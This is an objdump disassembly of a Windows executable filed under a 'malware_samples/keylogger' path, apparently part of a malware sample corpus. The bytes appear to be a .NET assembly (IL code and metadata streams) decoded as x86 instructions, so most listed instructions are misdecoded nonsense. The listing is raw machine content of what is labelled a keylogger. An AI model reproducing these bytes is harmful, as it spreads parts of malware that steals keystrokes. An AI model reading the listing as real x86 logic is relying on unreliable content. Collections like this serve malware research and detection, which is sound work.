
malware_samples/keylogger/b25c7daaa80d7f6b73ed31a70b9523cefd58d4db6176afcfc4f1f106e44892b7.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	6c                   	insb   (%dx),%es:(%edi)
  402001:	37                   	aaa
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 8c 23 00    	add    %al,0x238c00
  402013:	00 68 12             	add    %ch,0x12(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
  402020:	f4                   	hlt
  402021:	35 00 00 b8 00       	xor    $0xb80000,%eax
	...
  40204e:	00 00                	add    %al,(%eax)
  402050:	13 30                	adc    (%eax),%esi
  402052:	04 00                	add    $0x0,%al
  402054:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  40205a:	00 00                	add    %al,(%eax)
  40205c:	73 05                	jae    0x402063
  40205e:	00 00                	add    %al,(%eax)
  402060:	06                   	push   %es
  402061:	6f                   	outsl  %ds:(%esi),(%dx)
  402062:	04 00                	add    $0x0,%al
  402064:	00 06                	add    %al,(%esi)
  402066:	73 0c                	jae    0x402074
  402068:	00 00                	add    %al,(%eax)
  40206a:	06                   	push   %es
  40206b:	6f                   	outsl  %ds:(%esi),(%dx)
  40206c:	0a 00                	or     (%eax),%al
  40206e:	00 06                	add    %al,(%esi)
  402070:	7e 01                	jle    0x402073
  402072:	00 00                	add    %al,(%eax)
  402074:	04 7e                	add    $0x7e,%al
  402076:	04 00                	add    $0x0,%al
  402078:	00 04 28             	add    %al,(%eax,%ebp,1)
  40207b:	09 00                	or     %eax,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2c 1d                	sub    $0x1d,%al
  402081:	72 01                	jb     0x402084
  402083:	00 00                	add    %al,(%eax)
  402085:	70 7e                	jo     0x402105
  402087:	02 00                	add    (%eax),%al
  402089:	00 04 72             	add    %al,(%edx,%esi,2)
  40208c:	c0 00 00             	rolb   $0x0,(%eax)
  40208f:	70 28                	jo     0x4020b9
  402091:	0a 00                	or     (%eax),%al
  402093:	00 0a                	add    %cl,(%edx)
  402095:	16                   	push   %ss
  402096:	1f                   	pop    %ds
  402097:	10 28                	adc    %ch,(%eax)
  402099:	0b 00                	or     (%eax),%eax
  40209b:	00 0a                	add    %cl,(%edx)
  40209d:	26 72 ea             	es jb  0x40208a
  4020a0:	00 00                	add    %al,(%eax)
  4020a2:	70 28                	jo     0x4020cc
  4020a4:	0c 00                	or     $0x0,%al
  4020a6:	00 0a                	add    %cl,(%edx)
  4020a8:	8e 69 17             	mov    0x17(%ecx),%gs
  4020ab:	32 06                	xor    (%esi),%al
  4020ad:	28 0d 00 00 0a 2a    	sub    %cl,0x2a0a0000
  4020b3:	7e 04                	jle    0x4020b9
  4020b5:	00 00                	add    %al,(%eax)
  4020b7:	04 28                	add    $0x28,%al
  4020b9:	0e                   	push   %cs
  4020ba:	00 00                	add    %al,(%eax)
  4020bc:	0a 26                	or     (%esi),%ah
  4020be:	15 28 0f 00 00       	adc    $0xf28,%eax
  4020c3:	0a 2a                	or     (%edx),%ch
  4020c5:	1e                   	push   %ds
  4020c6:	02 28                	add    (%eax),%ch
  4020c8:	10 00                	adc    %al,(%eax)
  4020ca:	00 0a                	add    %cl,(%edx)
  4020cc:	2a 00                	sub    (%eax),%al
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	13 30                	adc    (%eax),%esi
  4020d2:	02 00                	add    (%eax),%al
  4020d4:	44                   	inc    %esp
  4020d5:	00 00                	add    %al,(%eax)
  4020d7:	00 00                	add    %al,(%eax)
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	00 28                	add    %ch,(%eax)
  4020dd:	11 00                	adc    %eax,(%eax)
  4020df:	00 0a                	add    %cl,(%edx)
  4020e1:	80 01 00             	addb   $0x0,(%ecx)
  4020e4:	00 04 28             	add    %al,(%eax,%ebp,1)
  4020e7:	12 00                	adc    (%eax),%al
  4020e9:	00 0a                	add    %cl,(%edx)
  4020eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ec:	13 00                	adc    (%eax),%eax
  4020ee:	00 0a                	add    %cl,(%edx)
  4020f0:	80 02 00             	addb   $0x0,(%edx)
  4020f3:	00 04 1f             	add    %al,(%edi,%ebx,1)
  4020f6:	1a 28                	sbb    (%eax),%ch
  4020f8:	14 00                	adc    $0x0,%al
  4020fa:	00 0a                	add    %cl,(%edx)
  4020fc:	72 1e                	jb     0x40211c
  4020fe:	01 00                	add    %eax,(%eax)
  402100:	70 28                	jo     0x40212a
  402102:	0a 00                	or     (%eax),%al
  402104:	00 0a                	add    %cl,(%edx)
  402106:	80 03 00             	addb   $0x0,(%ebx)
  402109:	00 04 7e             	add    %al,(%esi,%edi,2)
  40210c:	03 00                	add    (%eax),%eax
  40210e:	00 04 72             	add    %al,(%edx,%esi,2)
  402111:	34 01                	xor    $0x1,%al
  402113:	00 70 28             	add    %dh,0x28(%eax)
  402116:	0a 00                	or     (%eax),%al
  402118:	00 0a                	add    %cl,(%edx)
  40211a:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40211e:	04 2a                	add    $0x2a,%al
  402120:	13 30                	adc    (%eax),%esi
  402122:	04 00                	add    $0x0,%al
  402124:	64 00 00             	add    %al,%fs:(%eax)
  402127:	00 00                	add    %al,(%eax)
  402129:	00 00                	add    %al,(%eax)
  40212b:	00 7e 03             	add    %bh,0x3(%esi)
  40212e:	00 00                	add    %al,(%eax)
  402130:	04 28                	add    $0x28,%al
  402132:	15 00 00 0a 2d       	adc    $0x2d0a0000,%eax
  402137:	11 7e 03             	adc    %edi,0x3(%esi)
  40213a:	00 00                	add    %al,(%eax)
  40213c:	04 28                	add    $0x28,%al
  40213e:	16                   	push   %ss
  40213f:	00 00                	add    %al,(%eax)
  402141:	0a 1f                	or     (%edi),%bl
  402143:	12 6f 17             	adc    0x17(%edi),%ch
  402146:	00 00                	add    %al,(%eax)
  402148:	0a 7e 04             	or     0x4(%esi),%bh
  40214b:	00 00                	add    %al,(%eax)
  40214d:	04 28                	add    $0x28,%al
  40214f:	18 00                	sbb    %al,(%eax)
  402151:	00 0a                	add    %cl,(%edx)
  402153:	2c 01                	sub    $0x1,%al
  402155:	2a 7e 01             	sub    0x1(%esi),%bh
  402158:	00 00                	add    %al,(%eax)
  40215a:	04 7e                	add    $0x7e,%al
  40215c:	04 00                	add    $0x0,%al
  40215e:	00 04 28             	add    %al,(%eax,%ebp,1)
  402161:	19 00                	sbb    %eax,(%eax)
  402163:	00 0a                	add    %cl,(%edx)
  402165:	7e 04                	jle    0x40216b
  402167:	00 00                	add    %al,(%eax)
  402169:	04 18                	add    $0x18,%al
  40216b:	28 1a                	sub    %bl,(%edx)
  40216d:	00 00                	add    %al,(%eax)
  40216f:	0a 7e 1b             	or     0x1b(%esi),%bh
  402172:	00 00                	add    %al,(%eax)
  402174:	0a 72 72             	or     0x72(%edx),%dh
  402177:	01 00                	add    %eax,(%eax)
  402179:	70 6f                	jo     0x4021ea
  40217b:	1c 00                	sbb    $0x0,%al
  40217d:	00 0a                	add    %cl,(%edx)
  40217f:	72 ce                	jb     0x40214f
  402181:	01 00                	add    %eax,(%eax)
  402183:	70 7e                	jo     0x402203
  402185:	04 00                	add    $0x0,%al
  402187:	00 04 17             	add    %al,(%edi,%edx,1)
  40218a:	6f                   	outsl  %ds:(%esi),(%dx)
  40218b:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402190:	1e                   	push   %ds
  402191:	02 28                	add    (%eax),%ch
  402193:	02 00                	add    (%eax),%al
  402195:	00 06                	add    %al,(%esi)
  402197:	2a 13                	sub    (%ebx),%dl
  402199:	30 04 00             	xor    %al,(%eax,%eax,1)
  40219c:	20 00                	and    %al,(%eax)
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	01 00                	add    %eax,(%eax)
  4021a2:	00 11                	add    %dl,(%ecx)
  4021a4:	72 d0                	jb     0x402176
  4021a6:	01 00                	add    %eax,(%eax)
  4021a8:	70 28                	jo     0x4021d2
  4021aa:	08 00                	or     %al,(%eax)
  4021ac:	00 06                	add    %al,(%esi)
  4021ae:	0a 1f                	or     (%edi),%bl
  4021b0:	0d 02 7b 07 00       	or     $0x77b02,%eax
  4021b5:	00 04 06             	add    %al,(%esi,%eax,1)
  4021b8:	16                   	push   %ss
  4021b9:	28 06                	sub    %al,(%esi)
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	06                   	push   %es
  4021be:	80 08 00             	orb    $0x0,(%eax)
  4021c1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4021c4:	1b 30                	sbb    (%eax),%esi
  4021c6:	04 00                	add    $0x0,%al
  4021c8:	1d 01 00 00 02       	sbb    $0x2000001,%eax
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	11 02                	adc    %eax,(%edx)
  4021d1:	16                   	push   %ss
  4021d2:	2f                   	das
  4021d3:	13 7e 1e             	adc    0x1e(%esi),%edi
  4021d6:	00 00                	add    %al,(%eax)
  4021d8:	0a 02                	or     (%edx),%al
  4021da:	03 28                	add    (%eax),%ebp
  4021dc:	1f                   	pop    %ds
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	0a 04 28             	or     (%eax,%ebp,1),%al
  4021e2:	07                   	pop    %es
  4021e3:	00 00                	add    %al,(%eax)
  4021e5:	06                   	push   %es
  4021e6:	2a d0                	sub    %al,%dl
  4021e8:	07                   	pop    %es
  4021e9:	00 00                	add    %al,(%eax)
  4021eb:	01 28                	add    %ebp,(%eax)
  4021ed:	20 00                	and    %al,(%eax)
  4021ef:	00 0a                	add    %cl,(%edx)
  4021f1:	28 21                	sub    %ah,(%ecx)
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	0a 0a                	or     (%edx),%cl
  4021f7:	7e 09                	jle    0x402202
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	04 28                	add    $0x28,%al
  4021fd:	18 00                	sbb    %al,(%eax)
  4021ff:	00 0a                	add    %cl,(%edx)
  402201:	2d 3d 7e 09 00       	sub    $0x97e3d,%eax
  402206:	00 04 28             	add    %al,(%eax,%ebp,1)
  402209:	22 00                	and    (%eax),%al
  40220b:	00 0a                	add    %cl,(%edx)
  40220d:	6f                   	outsl  %ds:(%esi),(%dx)
  40220e:	23 00                	and    (%eax),%eax
  402210:	00 0a                	add    %cl,(%edx)
  402212:	7e 09                	jle    0x40221d
  402214:	00 00                	add    %al,(%eax)
  402216:	04 18                	add    $0x18,%al
  402218:	28 1a                	sub    %bl,(%edx)
  40221a:	00 00                	add    %al,(%eax)
  40221c:	0a de                	or     %dh,%bl
  40221e:	21 0d 72 de 01 00    	and    %ecx,0x1de72
  402224:	70 09                	jo     0x40222f
  402226:	6f                   	outsl  %ds:(%esi),(%dx)
  402227:	24 00                	and    $0x0,%al
  402229:	00 0a                	add    %cl,(%edx)
  40222b:	28 0a                	sub    %cl,(%edx)
  40222d:	00 00                	add    %al,(%eax)
  40222f:	0a 72 0e             	or     0xe(%edx),%dh
  402232:	02 00                	add    (%eax),%al
  402234:	70 16                	jo     0x40224c
  402236:	1f                   	pop    %ds
  402237:	10 28                	adc    %ch,(%eax)
  402239:	0b 00                	or     (%eax),%eax
  40223b:	00 0a                	add    %cl,(%edx)
  40223d:	26 de 00             	fiadds %es:(%eax)
  402240:	7e 09                	jle    0x40224b
  402242:	00 00                	add    %al,(%eax)
  402244:	04 17                	add    $0x17,%al
  402246:	73 25                	jae    0x40226d
  402248:	00 00                	add    %al,(%eax)
  40224a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40224d:	6f                   	outsl  %ds:(%esi),(%dx)
  40224e:	26 00 00             	add    %al,%es:(%eax)
  402251:	0a 13                	or     (%ebx),%dl
  402253:	04 2b                	add    $0x2b,%al
  402255:	5e                   	pop    %esi
  402256:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402259:	27                   	daa
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a a5 07 00 00 01    	or     0x1000007(%ebp),%ah
  402262:	13 05 11 05 28 09    	adc    0x9280511,%eax
  402268:	00 00                	add    %al,(%eax)
  40226a:	06                   	push   %es
  40226b:	20 00                	and    %al,(%eax)
  40226d:	80 00 00             	addb   $0x0,(%eax)
  402270:	5f                   	pop    %edi
  402271:	28 28                	sub    %ch,(%eax)
  402273:	00 00                	add    %al,(%eax)
  402275:	0a 12                	or     (%edx),%dl
  402277:	05 fe 16 07 00       	add    $0x716fe,%eax
  40227c:	00 01                	add    %al,(%ecx)
  40227e:	6f                   	outsl  %ds:(%esi),(%dx)
  40227f:	29 00                	sub    %eax,(%eax)
  402281:	00 0a                	add    %cl,(%edx)
  402283:	0b 2c 2e             	or     (%esi,%ebp,1),%ebp
  402286:	11 05 d1 28 2a 00    	adc    %eax,0x2a28d1
  40228c:	00 0a                	add    %cl,(%edx)
  40228e:	2d 1d 72 22 02       	sub    $0x222721d,%eax
  402293:	00 70 12             	add    %dh,0x12(%eax)
  402296:	05 fe 16 07 00       	add    $0x716fe,%eax
  40229b:	00 01                	add    %al,(%ecx)
  40229d:	6f                   	outsl  %ds:(%esi),(%dx)
  40229e:	29 00                	sub    %eax,(%eax)
  4022a0:	00 0a                	add    %cl,(%edx)
  4022a2:	72 2a                	jb     0x4022ce
  4022a4:	02 00                	add    (%eax),%al
  4022a6:	70 28                	jo     0x4022d0
  4022a8:	2b 00                	sub    (%eax),%eax
  4022aa:	00 0a                	add    %cl,(%edx)
  4022ac:	0b 08                	or     (%eax),%ecx
  4022ae:	07                   	pop    %es
  4022af:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b0:	2c 00                	sub    $0x0,%al
  4022b2:	00 0a                	add    %cl,(%edx)
  4022b4:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4022b7:	2d 00 00 0a 2d       	sub    $0x2d0a0000,%eax
  4022bc:	99                   	cltd
  4022bd:	de 15 11 04 75 0c    	ficoms 0xc750411
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	01 13                	add    %edx,(%ebx)
  4022c7:	06                   	push   %es
  4022c8:	11 06                	adc    %eax,(%esi)
  4022ca:	2c 07                	sub    $0x7,%al
  4022cc:	11 06                	adc    %eax,(%esi)
  4022ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4022cf:	2e 00 00             	add    %al,%cs:(%eax)
  4022d2:	0a dc                	or     %ah,%bl
  4022d4:	08 6f 2f             	or     %ch,0x2f(%edi)
  4022d7:	00 00                	add    %al,(%eax)
  4022d9:	0a 7e 1e             	or     0x1e(%esi),%bh
  4022dc:	00 00                	add    %al,(%eax)
  4022de:	0a 02                	or     (%edx),%al
  4022e0:	03 28                	add    (%eax),%ebp
  4022e2:	1f                   	pop    %ds
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	0a 04 28             	or     (%eax,%ebp,1),%al
  4022e8:	07                   	pop    %es
  4022e9:	00 00                	add    %al,(%eax)
  4022eb:	06                   	push   %es
  4022ec:	2a 00                	sub    (%eax),%al
  4022ee:	00 00                	add    %al,(%eax)
  4022f0:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4022f3:	00 00                	add    %al,(%eax)
  4022f5:	00 33                	add    %dh,(%ebx)
  4022f7:	00 1c 4f             	add    %bl,(%edi,%ecx,2)
  4022fa:	00 21                	add    %ah,(%ecx)
  4022fc:	0a 00                	or     (%eax),%al
  4022fe:	00 01                	add    %al,(%ecx)
  402300:	02 00                	add    (%eax),%al
  402302:	84 00                	test   %al,(%eax)
  402304:	6b ef 00             	imul   $0x0,%edi,%ebp
  402307:	15 00 00 00 00       	adc    $0x0,%eax
  40230c:	66 02 14 fe          	data16 add (%esi,%edi,8),%dl
  402310:	06                   	push   %es
  402311:	0b 00                	or     (%eax),%eax
  402313:	00 06                	add    %al,(%esi)
  402315:	73 12                	jae    0x402329
  402317:	00 00                	add    %al,(%eax)
  402319:	06                   	push   %es
  40231a:	7d 07                	jge    0x402323
  40231c:	00 00                	add    %al,(%eax)
  40231e:	04 02                	add    $0x2,%al
  402320:	28 02                	sub    %al,(%edx)
  402322:	00 00                	add    %al,(%eax)
  402324:	06                   	push   %es
  402325:	2a 7e 7e             	sub    0x7e(%esi),%bh
  402328:	1e                   	push   %ds
  402329:	00 00                	add    %al,(%eax)
  40232b:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  402331:	7e 03                	jle    0x402336
  402333:	00 00                	add    %al,(%eax)
  402335:	04 72                	add    $0x72,%al
  402337:	32 02                	xor    (%edx),%al
  402339:	00 70 28             	add    %dh,0x28(%eax)
  40233c:	0a 00                	or     (%eax),%al
  40233e:	00 0a                	add    %cl,(%edx)
  402340:	80 09 00             	orb    $0x0,(%ecx)
  402343:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402346:	1e                   	push   %ds
  402347:	02 28                	add    (%eax),%ch
  402349:	10 00                	adc    %al,(%eax)
  40234b:	00 0a                	add    %cl,(%edx)
  40234d:	2a ae 7e 0a 00 00    	sub    0xa7e(%esi),%ch
  402353:	04 2d                	add    $0x2d,%al
  402355:	1e                   	push   %ds
  402356:	72 48                	jb     0x4023a0
  402358:	02 00                	add    (%eax),%al
  40235a:	70 d0                	jo     0x40232c
  40235c:	05 00 00 02 28       	add    $0x28020000,%eax
  402361:	20 00                	and    %al,(%eax)
  402363:	00 0a                	add    %cl,(%edx)
  402365:	6f                   	outsl  %ds:(%esi),(%dx)
  402366:	30 00                	xor    %al,(%eax)
  402368:	00 0a                	add    %cl,(%edx)
  40236a:	73 31                	jae    0x40239d
  40236c:	00 00                	add    %al,(%eax)
  40236e:	0a 80 0a 00 00 04    	or     0x400000a(%eax),%al
  402374:	7e 0a                	jle    0x402380
  402376:	00 00                	add    %al,(%eax)
  402378:	04 2a                	add    $0x2a,%al
  40237a:	1a 7e 0b             	sbb    0xb(%esi),%bh
  40237d:	00 00                	add    %al,(%eax)
  40237f:	04 2a                	add    $0x2a,%al
  402381:	1e                   	push   %ds
  402382:	02 80 0b 00 00 04    	add    0x400000b(%eax),%al
  402388:	2a 00                	sub    (%eax),%al
  40238a:	00 00                	add    %al,(%eax)
  40238c:	42                   	inc    %edx
  40238d:	53                   	push   %ebx
  40238e:	4a                   	dec    %edx
  40238f:	42                   	inc    %edx
  402390:	01 00                	add    %eax,(%eax)
  402392:	01 00                	add    %eax,(%eax)
  402394:	00 00                	add    %al,(%eax)
  402396:	00 00                	add    %al,(%eax)
  402398:	0c 00                	or     $0x0,%al
  40239a:	00 00                	add    %al,(%eax)
  40239c:	76 34                	jbe    0x4023d2
  40239e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4023a1:	33 30                	xor    (%eax),%esi
  4023a3:	33 31                	xor    (%ecx),%esi
  4023a5:	39 00                	cmp    %eax,(%eax)
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	00 05 00 6c 00 00    	add    %al,0x6c00
  4023af:	00 08                	add    %cl,(%eax)
  4023b1:	06                   	push   %es
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	23 7e 00             	and    0x0(%esi),%edi
  4023b7:	00 74 06 00          	add    %dh,0x0(%esi,%eax,1)
  4023bb:	00 24 07             	add    %ah,(%edi,%eax,1)
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	23 53 74             	and    0x74(%ebx),%edx
  4023c3:	72 69                	jb     0x40242e
  4023c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4023c6:	67 73 00             	addr16 jae 0x4023c9
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	00 98 0d 00 00 7c    	add    %bl,0x7c00000d(%eax)
  4023d1:	02 00                	add    (%eax),%al
  4023d3:	00 23                	add    %ah,(%ebx)
  4023d5:	55                   	push   %ebp
  4023d6:	53                   	push   %ebx
  4023d7:	00 14 10             	add    %dl,(%eax,%edx,1)
  4023da:	00 00                	add    %al,(%eax)
  4023dc:	10 00                	adc    %al,(%eax)
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	23 47 55             	and    0x55(%edi),%eax
  4023e3:	49                   	dec    %ecx
  4023e4:	44                   	inc    %esp
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	00 24 10             	add    %ah,(%eax,%edx,1)
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	44                   	inc    %esp
  4023ed:	02 00                	add    (%eax),%al
  4023ef:	00 23                	add    %ah,(%ebx)
  4023f1:	42                   	inc    %edx
  4023f2:	6c                   	insb   (%dx),%es:(%edi)
  4023f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f4:	62 00                	bound  %eax,(%eax)
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	02 00                	add    (%eax),%al
  4023fe:	00 01                	add    %al,(%ecx)
  402400:	57                   	push   %edi
  402401:	1d a2 15 09 03       	sbb    $0x30915a2,%eax
  402406:	00 00                	add    %al,(%eax)
  402408:	00 fa                	add    %bh,%dl
  40240a:	01 33                	add    %esi,(%ebx)
  40240c:	00 16                	add    %dl,(%esi)
  40240e:	00 00                	add    %al,(%eax)
  402410:	01 00                	add    %eax,(%eax)
  402412:	00 00                	add    %al,(%eax)
  402414:	32 00                	xor    (%eax),%al
  402416:	00 00                	add    %al,(%eax)
  402418:	06                   	push   %es
  402419:	00 00                	add    %al,(%eax)
  40241b:	00 0b                	add    %cl,(%ebx)
  40241d:	00 00                	add    %al,(%eax)
  40241f:	00 15 00 00 00 1a    	add    %dl,0x1a000000
  402425:	00 00                	add    %al,(%eax)
  402427:	00 31                	add    %dh,(%ecx)
  402429:	00 00                	add    %al,(%eax)
  40242b:	00 02                	add    %al,(%edx)
  40242d:	00 00                	add    %al,(%eax)
  40242f:	00 09                	add    %cl,(%ecx)
  402431:	00 00                	add    %al,(%eax)
  402433:	00 02                	add    %al,(%edx)
  402435:	00 00                	add    %al,(%eax)
  402437:	00 01                	add    %al,(%ecx)
  402439:	00 00                	add    %al,(%eax)
  40243b:	00 02                	add    %al,(%edx)
  40243d:	00 00                	add    %al,(%eax)
  40243f:	00 03                	add    %al,(%ebx)
  402441:	00 00                	add    %al,(%eax)
  402443:	00 02                	add    %al,(%edx)
  402445:	00 00                	add    %al,(%eax)
  402447:	00 04 00             	add    %al,(%eax,%eax,1)
  40244a:	00 00                	add    %al,(%eax)
  40244c:	01 00                	add    %eax,(%eax)
  40244e:	00 00                	add    %al,(%eax)
  402450:	03 00                	add    (%eax),%eax
  402452:	00 00                	add    %al,(%eax)
  402454:	01 00                	add    %eax,(%eax)
  402456:	00 00                	add    %al,(%eax)
  402458:	01 00                	add    %eax,(%eax)
  40245a:	00 00                	add    %al,(%eax)
  40245c:	00 00                	add    %al,(%eax)
  40245e:	c3                   	ret
  40245f:	02 01                	add    (%ecx),%al
  402461:	00 00                	add    %al,(%eax)
  402463:	00 00                	add    %al,(%eax)
  402465:	00 06                	add    %al,(%esi)
  402467:	00 71 02             	add    %dh,0x2(%ecx)
  40246a:	ff 04 06             	incl   (%esi,%eax,1)
  40246d:	00 91 02 ff 04 06    	add    %dl,0x604ff02(%ecx)
  402473:	00 2b                	add    %ch,(%ebx)
  402475:	02 ec                	add    %ah,%ch
  402477:	04 0f                	add    $0xf,%al
  402479:	00 54 05 00          	add    %dl,0x0(%ebp,%eax,1)
  40247d:	00 06                	add    %al,(%esi)
  40247f:	00 58 02             	add    %bl,0x2(%eax)
  402482:	cd 02                	int    $0x2
  402484:	06                   	push   %es
  402485:	00 0f                	add    %cl,(%edi)
  402487:	06                   	push   %es
  402488:	89 03                	mov    %eax,(%ebx)
  40248a:	0a 00                	or     (%eax),%al
  40248c:	03 06                	add    (%esi),%eax
  40248e:	ae                   	scas   %es:(%edi),%al
  40248f:	05 06 00 be 06       	add    $0x6be0006,%eax
  402494:	89 03                	mov    %eax,(%ebx)
  402496:	06                   	push   %es
  402497:	00 a8 04 35 00 06    	add    %ch,0x6003504(%eax)
  40249d:	00 0e                	add    %cl,(%esi)
  40249f:	04 89                	add    $0x89,%al
  4024a1:	03 06                	add    (%esi),%eax
  4024a3:	00 be 04 c3 05 06    	add    %bh,0x605c304(%esi)
  4024a9:	00 cb                	add    %cl,%bl
  4024ab:	00 89 03 06 00 9e    	add    %cl,-0x61fff9fd(%ecx)
  4024b1:	01 89 03 06 00 3e    	add    %ecx,0x3e000603(%ecx)
  4024b7:	06                   	push   %es
  4024b8:	89 03                	mov    %eax,(%ebx)
  4024ba:	06                   	push   %es
  4024bb:	00 16                	add    %dl,(%esi)
  4024bd:	03 89 03 0e 00 f7    	add    -0x8fff1fd(%ecx),%ecx
  4024c3:	01 77 04             	add    %esi,0x4(%edi)
  4024c6:	06                   	push   %es
  4024c7:	00 0e                	add    %cl,(%esi)
  4024c9:	02 ec                	add    %ah,%ch
  4024cb:	04 06                	add    $0x6,%al
  4024cd:	00 dc                	add    %bl,%ah
  4024cf:	01 ff                	add    %edi,%edi
  4024d1:	04 06                	add    $0x6,%al
  4024d3:	00 67 04             	add    %ah,0x4(%edi)
  4024d6:	1f                   	pop    %ds
  4024d7:	05 06 00 1c 04       	add    $0x41c0006,%eax
  4024dc:	e7 03                	out    %eax,$0x3
  4024de:	0e                   	push   %cs
  4024df:	00 b0 01 42 03 0e    	add    %dh,0xe034201(%eax)
  4024e5:	00 3f                	add    %bh,(%edi)
  4024e7:	02 42 03             	add    0x3(%edx),%al
  4024ea:	06                   	push   %es
  4024eb:	00 e9                	add    %ch,%cl
  4024ed:	02 89 03 0a 00 b3    	add    -0x4cfff5fd(%ecx),%cl
  4024f3:	06                   	push   %es
  4024f4:	ae                   	scas   %es:(%edi),%al
  4024f5:	05 0a 00 4b 06       	add    $0x64b000a,%eax
  4024fa:	ae                   	scas   %es:(%edi),%al
  4024fb:	05 0a 00 d6 05       	add    $0x5d6000a,%eax
  402500:	ae                   	scas   %es:(%edi),%al
  402501:	05 0a 00 cc 03       	add    $0x3cc000a,%eax
  402506:	ae                   	scas   %es:(%edi),%al
  402507:	05 0e 00 f3 05       	add    $0x5f3000e,%eax
  40250c:	ec                   	in     (%dx),%al
  40250d:	04 0a                	add    $0xa,%al
  40250f:	00 db                	add    %bl,%bl
  402511:	03 ae 05 06 00 5f    	add    0x5f000605(%esi),%ebp
  402517:	06                   	push   %es
  402518:	89 03                	mov    %eax,(%ebx)
  40251a:	06                   	push   %es
  40251b:	00 b0 03 89 03 7b    	add    %dh,0x7b038903(%eax)
  402521:	00 55 04             	add    %dl,0x4(%ebp)
  402524:	00 00                	add    %al,(%eax)
  402526:	06                   	push   %es
  402527:	00 01                	add    %al,(%ecx)
  402529:	07                   	pop    %es
  40252a:	35 00 06 00 37       	xor    $0x37000600,%eax
  40252f:	04 35                	add    $0x35,%al
  402531:	00 06                	add    %al,(%esi)
  402533:	00 28                	add    %ch,(%eax)
  402535:	04 35                	add    $0x35,%al
  402537:	00 06                	add    %al,(%esi)
  402539:	00 82 05 35 00 06    	add    %al,0x6003505(%edx)
  40253f:	00 fb                	add    %bh,%bl
  402541:	00 35 00 06 00 0b    	add    %dh,0xb000600
  402547:	07                   	pop    %es
  402548:	01 00                	add    %eax,(%eax)
  40254a:	06                   	push   %es
  40254b:	00 d1                	add    %dl,%cl
  40254d:	06                   	push   %es
  40254e:	01 00                	add    %eax,(%eax)
  402550:	06                   	push   %es
  402551:	00 7b 00             	add    %bh,0x0(%ebx)
  402554:	01 00                	add    %eax,(%eax)
  402556:	06                   	push   %es
  402557:	00 e5                	add    %ah,%ch
  402559:	04 89                	add    $0x89,%al
  40255b:	03 06                	add    (%esi),%eax
  40255d:	00 57 01             	add    %dl,0x1(%edi)
  402560:	89 03                	mov    %eax,(%ebx)
  402562:	06                   	push   %es
  402563:	00 d7                	add    %dl,%bh
  402565:	00 89 03 06 00 90    	add    %cl,-0x6ffff9fd(%ecx)
  40256b:	03 89 03 06 00 70    	add    0x70000603(%ecx),%ecx
  402571:	03 35 00 06 00 74    	add    0x74000600,%esi
  402577:	03 35 00 06 00 9b    	add    0x9b000600,%esi
  40257d:	04 35                	add    $0x35,%al
  40257f:	00 06                	add    %al,(%esi)
  402581:	00 7d 06             	add    %bh,0x6(%ebp)
  402584:	89 03                	mov    %eax,(%ebx)
  402586:	06                   	push   %es
  402587:	00 50 04             	add    %dl,0x4(%eax)
  40258a:	89 03                	mov    %eax,(%ebx)
  40258c:	06                   	push   %es
  40258d:	00 e1                	add    %ah,%cl
  40258f:	06                   	push   %es
  402590:	fc                   	cld
  402591:	03 00                	add    (%eax),%eax
  402593:	00 00                	add    %al,(%eax)
  402595:	00 11                	add    %dl,(%ecx)
  402597:	00 00                	add    %al,(%eax)
  402599:	00 00                	add    %al,(%eax)
  40259b:	00 01                	add    %al,(%ecx)
  40259d:	00 01                	add    %al,(%ecx)
  40259f:	00 01                	add    %al,(%ecx)
  4025a1:	00 10                	add    %dl,(%eax)
  4025a3:	00 5c 01 f0          	add    %bl,-0x10(%ecx,%eax,1)
  4025a7:	02 19                	add    (%ecx),%bl
  4025a9:	00 01                	add    %al,(%ecx)
  4025ab:	00 01                	add    %al,(%ecx)
  4025ad:	00 01                	add    %al,(%ecx)
  4025af:	00 10                	add    %dl,(%eax)
  4025b1:	00 be 02 f0 02 08    	add    %bh,0x802f002(%esi)
  4025b7:	00 05 00 04 00 01    	add    %al,0x1000400
  4025bd:	00 10                	add    %dl,(%eax)
